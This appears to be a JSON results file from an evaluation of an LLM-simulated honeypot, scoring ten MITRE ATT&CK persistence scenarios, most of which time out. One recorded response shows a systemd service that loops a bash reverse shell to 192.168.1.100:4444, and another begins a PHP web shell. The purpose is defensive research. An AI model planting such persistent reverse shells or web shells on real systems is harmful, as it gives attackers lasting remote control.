@@ -1,0 +1,229 @@
+{
+  "baseline": "shelLM",
+  "mode": "wexpect_direct",
+  "test_time": "2026-01-23T16:41:13.559423",
+  "num_rounds": 1,
+  "scenarios_per_round": 10,
+  "per_round_metrics": [
+    {
+      "round_number": 1,
+      "spr": 0.1,
+      "sfr": 0.0,
+      "pdr_high": 0.0,
+      "pdr_medium": 0.0,
+      "pdr_low": 0.0,
+      "avg_latency_ms": 1258.8036894798279,
+      "total_tokens": 891273,
+      "total_scenarios": 10,
+      "passed_scenarios": 0
+    }
+  ],
+  "aggregated_metrics": {
+    "spr": {
+      "mean": 0.1,
+      "std": 0.0,
+      "min": 0.1,
+      "max": 0.1
+    },
+    "sfr": {
+      "mean": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    "pdr_high": {
+      "mean": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    "pdr_medium": {
+      "mean": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    "pdr_low": {
+      "mean": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    "latency_ms": {
+      "mean": 1258.8037,
+      "std": 0.0,
+      "min": 1258.8037,
+      "max": 1258.8037
+    },
+    "total_tokens": {
+      "mean": 891273.0,
+      "std": 0.0,
+      "min": 891273.0,
+      "max": 891273.0
+    }
+  },
+  "per_round_results": [
+    [
+      {
+        "scenario_id": "HC-T1053-003",
+        "mitre_id": "T1053.003",
+        "technique": "Scheduled Task/Job: Cron",
+        "implant_success": true,
+        "verify_success": false,
+        "state_persisted": true,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "root@honeypot-14:~",
+        "verify_response": "Error: Timeout waiting for response",
+        "implant_latency_ms": 8533.828258514404,
+        "verify_latency_ms": 0.0,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1543-002",
+        "mitre_id": "T1543.002",
+        "technique": "Create or Modify System Process: Systemd Service",
+        "implant_success": false,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": true,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "enabled\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; sleep 3600; done'\nuser@server-22:~",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 7715.510129928589,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1098-004",
+        "mitre_id": "T1098.004",
+        "technique": "Account Manipulation: SSH Authorized Keys",
+        "implant_success": false,
+        "verify_success": false,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "Error: Timeout waiting for response",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 0.0,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1136-001",
+        "mitre_id": "T1136.001",
+        "technique": "Create Account: Local Account",
+        "implant_success": false,
+        "verify_success": false,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "Error: Timeout waiting for response",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 0.0,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1546-004",
+        "mitre_id": "T1546.004",
+        "technique": "Event Triggered Execution: Unix Shell Configuration Modification",
+        "implant_success": false,
+        "verify_success": false,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "Error: Timeout waiting for response",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 0.0,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1037-004",
+        "mitre_id": "T1037.004",
+        "technique": "Boot or Logon Initialization Scripts: RC Scripts",
+        "implant_success": false,
+        "verify_success": false,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "Error: Timeout waiting for response",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 0.0,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1505-003",
+        "mitre_id": "T1505.003",
+        "technique": "Server Software Component: Web Shell",
+        "implant_success": false,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "<?php if(isset(",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 8926.735401153564,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1574-006",
+        "mitre_id": "T1574.006",
+        "technique": "Hijack Execution Flow: Dynamic Linker Hijacking",
+        "implant_success": false,
+        "verify_success": false,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "Error: Timeout waiting for response",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 0.0,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1556-003",
+        "mitre_id": "T1556.003",
+        "technique": "Modify Authentication Process: Pluggable Authentication Modules",
+        "implant_success": false,
+        "verify_success": false,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "Error: Timeout waiting for response",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 0.0,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1078-003",
+        "mitre_id": "T1078.003",
+        "technique": "Valid Accounts: Local Accounts",
+        "implant_success": false,
+        "verify_success": false,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "Error: Timeout waiting for response",
+        "verify_response": "Error: Timeout waiting for response",
+        "implant_latency_ms": 0.0,
+        "verify_latency_ms": 0.0,
+        "error": null
+      }
+    ]
+  ]
+}
